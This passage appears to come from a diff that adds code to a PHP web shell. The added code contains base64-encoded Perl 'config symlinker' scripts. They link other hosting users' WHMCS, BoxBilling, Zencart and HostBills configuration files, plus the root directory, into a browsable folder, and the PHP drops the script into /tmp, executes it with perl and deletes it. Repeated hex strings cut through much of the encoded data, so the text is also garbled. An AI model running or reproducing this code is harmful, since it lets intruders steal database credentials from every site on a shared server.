0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYm94YmlsbGluZy9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2JveC9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2hvc3QvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9Ib3N0L2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydGVzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydC9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2hvc3RpbmcvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvb3JkZXIvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnQvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZS9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NsaWVudGVzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZy9iYi1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItQm94QmlsbGluZy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2JpbGxpbmdzL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbXkvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zZWN1cmUvYmItY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL2JiLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwIiwiaWR4X3N5bS8iLiQxLiItWmVuY2FydC50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwIiwiaWR4X3N5bS8iLiQxLiItWmVuY2FydC50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3Byb2R1Y3RzL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLVplbmNhcnQudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLVplbmNhcnQudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLVplbmNhcnQudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2hvc3RiaWxscy9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2hvc3QvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9Ib3N0L2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydGVzL2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2hvc3RpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvb3JkZXIvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnQvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRzL2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZS9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NsaWVudGVzL2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZy9pbmNsdWRlcy9pc280MjE3LnBocCIsImlkeF9zeW0vIi4kMS4iLUhvc3RiaWxscy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2JpbGxpbmdzL2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbXkvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zZWN1cmUvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL2luY2x1ZGVzL2lzbzQyM0x4d957169be41a75F466C49F955024E0644992890zdGJpbGxzLnR4dCIpOw0KCQlzeW1saW5rKCIvIiwiaWR4X3N5bS9yb290Iik7DQoJCXByaW50ICQxLiItIjsNCgl9DQp9DQoNCm9wZW4oT1VULCI+aWR4X3N5bS8uaHRhY2Nlc3MiKTsNCnByaW50IE9VVCAiT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBpbmRveHBsb2l0Lmh0bQ0KQWRkVHlwZSB0ZXh0L3BsYWluIC5waHANCkFkZEhhbmRsZXIgdGV4dC9wbGFpbiAucGhwDQp0x4d957169be41a75F466C49F955024E0644992890w0KcHJpbnQgJzxjZW50ZXI+PGgxPjxhIGhyZWY9ImlkeF9zeW0iIHRhcmdldD0iX0JMQU5LIj5DbGljayBIZXJlPC9hPjwvaDE+JzsNCnVubGluaygkMCk7";
+				save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
+				exe("perl /tmp/symlink.pl");
+				sleep(1);
+				@unlink("/tmp/symlink.pl");
+				@unlink("passwd.txt");
+				@unlink("idx_sym/pas.txt");
+			}
+
+			print "<div style='background: #ffffff; width: 100%; height: 100%'>";
+			print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym/' frameborder='0' scrolling='yes'></iframe>";
+			print "</div>";
+		}
+		else {
+			if($args[0] === "404") {
+				if(!is_dir(path()."/idx_sym404/")) {
+					$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQojICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjIA0KIw0KIwkJTmFtZSA6IFBlcmwvQ0dJIENvbmZpZyBTeW1saW5rZXIgKFdpdGggQXV0byBCeXBhc3MgU3ltbGluayA0MDQpDQojCQlWZXJzaW9uIDogMS4yDQojCQlDcmVhdGVkIDogOSBNZWkgMjAxNw0KIwkJQXV0aG9yIDogMHgxO0x4d957169be41a75F466C49F955024E06449928900ICwgSW5kb25lc2lhbiBDb2RlIFBhcnR5ICwgSmF0aW00dQ0KIwkJTW9yZSBJbmZvIDogaHR0cDovLzB4RGFyay5ibG9nc3BvdC5jb20NCiMJCVdhbnQgdG8gcmVjb2RlID8gRG9uJ3QgZm9yZ2V0IG15IG5pY2sgbmFtZSAgOikNCiMJCWh0dHA6Ly9mYWNlYm9vay5jb20vbWVsZXguMWQNCiMJCQ0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCg0KdXNlIEZpbGU6OkNvcHk7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KdXNlIE1J0x4d957169be41a75F466C49F955024E0644992890Fzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm1rZGlyICJpZHhfc3ltNDA0IjsNCnN5bWxpbmsoIi8iLCJpZHhfc3ltNDA0L3Jvb3QiK0x4d957169be41a75F466C49F955024E0644992890udHh0JzsNCm15ICRodGFjY2VzcyA9IGRlY29kZV9iYXNlNjQoIlQzQjBhVzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVDQnBibVJ2ZUhCc2IybDBMbWgwYlEwS1FXUmtWSGx3WlNCMFpYaDBMM0JzWVdsdUlDNXdhSEFnRFFwQlpHUklZVzVrYkdWeUlIUmxlSFF2Y0d4aGFXNGdMbkJvY0EwS1UyRjBhWE5tZVNCQmJua05Da2x1WkdWNFQzQjBhVzl1Y3lBclEyaGhjbk5sZEQxVlZFWXRPQ0FyUm1GdVkzbEpibVJsZUdsdVp5QXJTV2R1YjNKbFEyRnpaU0FyUm05c1pHVnljMFpwY25OMElDdFl0x4d957169be41a75F466C49F955024E0644992890EJ3Y21WemMxSjFiR1Z6SUN0VGRYQndjbVZ6YzBSbGMy0x4d957169be41a75F466C49F955024E0644992890lLaUFOQ2tGa1pFbGpiMjRnSjJSaGRHR0x4d957169be41a75F466C49F955024E0644992890Wa0pQVW5jd1MwZG5iMEZCUVVG0x4d957169be41a75F466C49F955024E0644992890dVRkJRVUZtT0M4NWFFRkJRVUZDU0U1RFUxWlJ0x4d957169be41a75F466C49F955024E0644992890Xg2UVVGQlRqRjNRVUZFWkdOQ1VXbHBZbVZCUVVGQlFtd3dVbFpv0x4d957169be41a75F466C49F955024E0644992890d4MVlU0x4d957169be41a75F466C49F955024E0644992890JRVVpWVTFWU1FsWkVhVTV3V2tzNVUyZE9Ra1pKV0ZCMldFNXVaR3BqVW05d1dEUlZOR3RYVm5JMVFVTm9WVGRJT0VKVFprbDBRVWhyUWpsRFdI0x4d957169be41a75F466C49F955024E0644992890FZMWxYWVU1dFRUSlBlSEY1ZVdsWldtUmpSMGxoV2pSYU56ZE5aV1ZSW0x4d957169be41a75F466C49F955024E0644992890GVWFqbHZVbE5sTWxveFpqSkxhbEF4Wm1kTWEyNU5VRk0xYkZjd1ZtazBjRnB2Y0haSVdFUlhLMGxvVDNJNU9XZFlWSHByY2pseGRsUkNUWFJ5VG1RNFFY0x4d957169be41a75F466C49F955024E0644992890tPVkZDWjA4eWFtUnp0x4d957169be41a75F466C49F955024E06449928900x4d957169be41a75F466C49F955024E06449928905VFU1b04xRldhV2hEUjB0alRraHpkMjFh0x4d957169be41a75F466C49F955024E0644992890Rsc05qQ0x4d957169be41a75F466C49F955024E0644992890SMW8wVDJsSWQxSlJSaXQyY0x4d957169be41a75F466C49F955024E0644992890ZclFuSnFiM2xSSzBOYVpuRnhNVEU0UkZKR1JXaHFaV0ppWW1Wc05tUkhhWGxVY1dZcmRsTnlhMkZTVVM4d2RYUk1OMjFJV0d3NWRuRXJaVkF6Vlc1aWFDOUlOV2RFUzJsUFJqWTNXV1ZpV1RCa1UwcGpVa0p0TUhveWNrWnNNbmxYY0RoQlZrUkpWek15WkdFM2NFeEJRVUZCUVVWc1JsUnJVM1ZSYlVOREp5QmVYa1JKVWtWRFZFOVNXVjVlRFFwRVpXWmhkV3gwU1dOdmJpQW5aR0YwWVRwcGJXRm5aUzl3Ym1jN1ltRnpaVFkw0x4d957169be41a75F466C49F955024E0644992890doRlZXZEJRVUZDUVVGQlFVRlJRMEZaUVVGQlFXW0x4d957169be41a75F466C49F955024E0644992890ZelpSUVVGQlFWcHBVekJrUlVGUU9FRXZkMFF2YjB3eWJtdDNRVUZCUVd4M1UwWnNla0ZCUVV4RmQwRkJRM2hOUWtGS2NXTkhRVUZCUVVGa01G0x4d957169be41a75F466C49F955024E0644992890JRVUZLVFZOVlVrSldSR3BNWWxwUE9WUm9lRnBGU1ZjdmNXeDJaSFJO0x4d957169be41a75F466C49F955024E0644992890t4M1IycHBkMGd6Ym5ka2Ex0x4d957169be41a75F466C49F955024E0644992890pSR1pF0x4d957169be41a75F466C49F955024E0644992890NCVGJGZHNWekJtYm010x4d957169be41a75F466C49F955024E0644992890NVbE1kMlJGVTJWYWVVRnBabTV3Tml0MU9XOU9URzh6WjAwelRucFVaRWh0x4d957169be41a75F466C49F955024E06449928900VGWVlYaGx0x4d957169be41a75F466C49F955024E06449928902szVEZWdVdqQmtXVzE0UVVaQlZrVnN0x4d957169be41a75F466C49F955024E06449928900ZFVDJw0x4d957169be41a75F466C49F955024E0644992890IxVkljbkpRW0x4d957169be41a75F466C49F955024E0644992890WUmJW0x4d957169be41a75F466C49F955024E0644992890hMMkkzU0ZG0x4d957169be41a75F466C49F955024E0644992890pWRmlVMnB5UlhKUmQwcHdjVVkwWlVGNEwyaHZjVVF40x4d957169be41a75F466C49F955024E0644992890ZGSmFXOXFkMkZ0VDBST2MyeHFabFZYUTNGd1RHNVBZV0ZEVTB0S2RHNWhRa056V2xscVFXeHNiVmhK0x4d957169be41a75F466C49F955024E0644992890tG0x4d957169be41a75F466C49F955024E0644992890lsY3J0x4d957169be41a75F466C49F955024E0644992890VZW0x4d957169be41a75F466C49F955024E0644992890JSR2IxSk9TME5vVFRJeWVHMVBVR1Z6Y0dwUVIxR0x4d957169be41a75F466C49F955024E0644992890iR3BFVEVWa1ZtRkdUMHhsT0ZwclZXcExOWFZyY1ROME56bHNVRU0z0x4d957169be41a75F466C49F955024E0644992890FZeGVUTm9lWHBtV0RCb2NYWktUSGxpV0Vaa0t5dG1NbVF6WkRCa2JY0x4d957169be41a75F466C49F955024E0644992890pPVFkwYzFNM0t6UjFSV3AxYm5CeGJWTmxObVV6UkROT050x4d957169be41a75F466C49F955024E0644992890XlPWFl5Wmt4RlpYWjJTemx4ZGpkak1uUnZTMms0VldscFVXbHhTR0p0Tm5KcFZ6WmhNVE5tYml0NmRqY3pLMjl4YjNKb1kweG5TMVZHV0ZaUUsyWnVOVElyVEc5dWFqaEpURW93VURoYVNV0x4d957169be41a75F466C49F955024E06449928901PVlUx0x4d957169be41a75F466C49F955024E0644992890VrOUp3MEt0x4d957169be41a75F466C49F955024E0644992890FFOQ2tsdVpHVjRVM1I1YkdWVGFHVmxkQ0FuYUhSMGNEb3ZMMlYyWlc1MExtbHVaRzk0Y0d4dmFYUXViM0l1YVdRdmMzbHRiR2x1YXk1amMz0x4d957169be41a75F466C49F955024E0644992890VEUXB0x4d957169be41a75F466C49F955024E0644992890TFSZlJrbE1SVTVCVFVWOUlGNHVLakI0YzNsdE5EQTBJRnRPUTEwTkNsSmxkM0pwZEdWU2RXeGxJRnd1ZEhoMEpDQWxlMUpGVVZWRlUxUmZWVkpKZlRRd05DQmJUQ3hTUFRNd01pNU9RMTA9Iik7DQpteSAkc3ltID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsW0x4d957169be41a75F466C49F955024E0644992890sMExtaDBiUTBLU0dWaFpHVnlUbUZ0WlNBd2VER0x4d957169be41a75F466C49F955024E0644992890lU0x4d957169be41a75F466C49F955024E06449928905WlVOaGMyVWdSbUZ1W0x4d957169be41a75F466C49F955024E0644992890seWMzUWdUbUZ0WlZkcFpIUm9QU29nUkdWelkzSnBjSFJwYjI1WGFXUjBhRDBxSUZOMWNIQnlaWE56U0ZSTlRGQnlaV0Z0WW14bERRcEpibVJsZUVsbmJtOXlaU0FxRFFwSmJtUmxlRk4wZVd4bFUyaGxaWFFnSjJoMGRIQ0x4d957169be41a75F466C49F955024E0644992890MbTl5TG1sa0wzTjViV3hwYm1zdVkzTnpKdz09Iik7DQpvcGVuKG15ICRmaDEsICc+JywgJ2lkeF9zeW00MDQvLmh0YWNjZXNzJyk7DQpwcmludCAkZmgxICIkaHRhY2Nlc3MiOw0KY2xvc2UgJGZoM0x4d957169be41a75F466C49F955024E0644992890fc3ltNDA0L25lbXUudHh0Jyk7DQpwcmludCAkeHggIiRzeW0iOw0KY2xvc2UgJHh4Ow0Kb3BlbihteSAkZmgsICc8OmVuY29kaW5nKFVURi04KScsICRmaWxlbmFtZSk7DQp3aGlsZSAobXkgJHJvdyA9IDwkZ